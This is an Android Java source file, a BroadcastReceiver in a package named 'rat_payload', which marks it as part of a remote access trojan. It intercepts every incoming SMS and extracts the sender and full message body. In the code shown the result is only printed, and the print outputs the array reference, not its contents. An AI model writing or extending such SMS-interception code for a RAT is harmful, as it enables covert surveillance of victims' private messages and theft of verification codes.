package com.app.rat_payload.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsMessage;

/**
 * Created by anirudh on 12/31/16.
 */

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs = null;
            String sender;
            String[] full_msg = new String[2];

            if(bundle != null) {

                // Receive Text Message.
                try {
                    Object[] pdus = (Object[])bundle.get("pdus");
                    if (pdus.length == 0) {
                        return;
                    }

                    // Large Messages can be broken broken into many.
                    msgs = new SmsMessage[pdus.length];
                    StringBuilder sb = new StringBuilder();
                    for(int i = 0; i<msgs.length; i++) {
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        sb.append(msgs[i].getMessageBody());
                    }
                    sender = msgs[0].getOriginatingAddress();
                    String message = sb.toString();

                    full_msg[0] = sender;
                    full_msg[1] = message;

                    System.out.println("NEW MESSAGE: " + full_msg);

                } catch (Exception e) {
                    e.printStackTrace();
                }

            }

        }
    }
}
